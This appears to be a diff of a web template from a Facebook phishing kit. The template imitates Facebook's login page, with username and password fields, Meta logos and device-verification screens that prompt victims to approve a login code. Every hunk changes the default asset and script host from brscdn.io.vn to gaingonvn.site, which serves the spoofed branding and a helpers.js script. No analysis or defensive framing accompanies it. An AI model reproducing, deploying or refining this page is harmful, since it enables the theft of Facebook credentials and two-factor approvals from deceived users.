@@ -15,7 +15,7 @@
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
     <link rel="shortcut icon"
-        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
+        href="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fblogo.png">
     @vite(['resources/css/app.css'])
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
         integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
@@ -39,7 +39,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -57,7 +57,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_other_devices_msg') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/another_device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/another_device.png" alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="text-5xl text-center font-bold tracking-[10px] mb-4" id="device_code">52</div>
             <div class="flex items-center gap-3 mb-5">
@@ -78,7 +78,7 @@
             <p class="text-[14px] text-black leading-relaxed mb-5">
                 {{ __('facebook.check_device_notification_message') }}</p>
             <div class="rounded-xl overflow-hidden mb-5">
-                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
+                <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
             </div>
             <div class="flex items-center gap-3 mb-5">
                 <i class="fa-light fa-circle-notch fa-spin"></i>
@@ -109,7 +109,7 @@
     <div class="w-[95vw] lg:w-[99vw] mx-auto mt-[30px] relative h-[90vh]" id="main">
         <p class="text-center text-sm text-[#646d74]">{{ __('facebook.' . app()->getLocale()) }}</p>
         <div class="h-[200px] flex justify-center items-center">
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_logo.png"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/fb_logo.png"
                 alt="fb-logo" width="60">
         </div>
         <p class="font-semibold mb-3 ml-2">{{ $data->login_warning }}</p>
@@ -126,7 +126,7 @@
                         class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                         for="user">{{filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                     <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
-                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
+                        <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/close_logo.svg"
                             width="25" />
                     </button>
                 </div>
@@ -141,11 +141,11 @@
                         for="pass">{{filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                     @if ($setting->showFacebookPasswordButton)
                         <button type="button" id="show_pass" class="cursor-pointer hidden" tabindex="-1">
-                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/show_pass.svg"
                                 width="25" />
                         </button>
                         <button type="button" id="hide_pass" class="cursor-pointer hidden" tabindex="-1">
-                            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
+                            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/hide_pass.svg"
                                 width="25" />
                         </button>
                     @endif
@@ -164,7 +164,7 @@
                 class="outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                 {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
             </button>
-            <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
+            <img src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/meta_logo.png"
                 alt="fb-logo" width="55">
             <div class="flex justify-center items-center gap-2">
                 <p class="text-[.7rem] cursor-pointer text-[#646d74]">{{ __('facebook.introduce') }}</p>
@@ -173,7 +173,7 @@
             </div>
         </div>
     </div>
-    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{ env('APP_CDN_DOMAIN', 'gaingonvn.site') }}/theme/system/facebook/helpers.js"></script>
     <script>
         ////
         @if ($type == 'custom')
